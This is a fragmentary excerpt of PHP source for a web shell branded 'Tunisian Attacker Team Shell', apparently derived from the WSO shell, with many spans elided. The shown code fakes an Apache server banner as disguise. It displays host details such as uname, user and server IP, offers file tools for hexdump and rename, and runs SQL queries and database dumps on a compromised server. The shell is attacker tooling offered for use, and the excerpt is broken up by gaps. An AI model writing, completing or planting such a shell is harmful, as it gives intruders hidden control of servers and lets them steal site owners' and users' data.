...
@define('Tunisian Attacker Shell Version', '1.1');
...
<address>Apache/2.2.22 (Unix) mod_ssl/2.2.22 OpenSSL/1.0.0-fips mod_auth_passthrough/2.1 mod_bwlimited/1.4 FrontPage/5.0.2.2635 Server at Port 80</address>
    <style>
        input { margin:0;background-color:#808080;border:1px solid #f808080; }
    </style>
    <pre align=center>
    <form method=post>
...
$wsobuff = "
"; 
...
function wsoHeader() {
	...
	global $color;
	echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>" . $_SERVER['HTTP_HOST'] . "- Tunisian Attacker Team Shell " ."</title>
<style>
...
input, textarea, select{ margin:0;color:#FFFFFF;background-color:#000;border:1px solid $color; font: 9pt Monospace,'Courier New'; } 
form{ margin:0px; } 
...
<head><body><div style='background: url(s21.postimg.org/w54zu0d8n/ggg.png); background-repeat:no-repeat; background-attachment:fixed; background-position:center;'>
...
<input type=hidden name=charset>
	...
	echo '<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:' . ($GLOBALS['os'] == 'win'?'<br>Drives:':'') . '</span></td>'
       ...
       . '<td width=1 align=right><nobr><select onchange="g(null,null,null,null,null,this.value)"><optgroup label="Page charset">' . $opt_charsets . '</optgroup></select><br><span>Server IP:</span><br>' . @$_SERVER["SERVER_ADDR"] . '<br><span>Client IP:</span><br>' . $_SERVER['REMOTE_ADDR'] . '<br> [Priv8 Shell v1.1] Made By Bad DaNger Tunisia Attacker Team <br></nobr></td></tr></table>'
...
function actionFilesTools() {
	...
	switch($_POST['p2']) {
		...
		case 'hexdump':
			...
			echo '<table cellspacing=1 cellpadding=5 bgcolor=#222222><tr><td bgcolor=#FFFAFA><span style="font-weight: normal;"><pre>'.$h[0].'</pre></span></td><td bgcolor=#282828><pre>'.$h[1].'</pre></td><td bgcolor=#FFFAFA><pre>'.htmlspecialchars($h[2]).'</pre></td></tr></table>';
			break;
		case 'rename':
			if( !empty($_POST['p3']) ) {
	...
	if(isset($db) && $db->link){
		echo "<br/><table width=100% cellpadding=2 cellspacing=0>";
			if(!empty($_POST['sql_base'])){
				...
				echo "<input type='checkbox' onclick='is();'> <input type=button value='Dump' onclick='document.sf.p2.value=\"download\";document.sf.submit();'><br>File path:<input type=text name=file value='dump.sql'></td><td style='border-top:2px solid #FFFAFA;'>";
				if(@$_POST['p1'] == 'select') {
					$_POST['p1'] = 'query';
				...
				if((@$_POST['p1'] == 'query') && !empty($_POST['p2'])) {
					...
					if($db->res !== false) {
						$title = false;
						echo '<table width=100% cellspacing=1 cellpadding=2 class=main style="background-color:#FFFAFA">';
						$line = 1;
						while($item = $db->fetch())	{
							if(!$title)	{
								echo '<tr>';
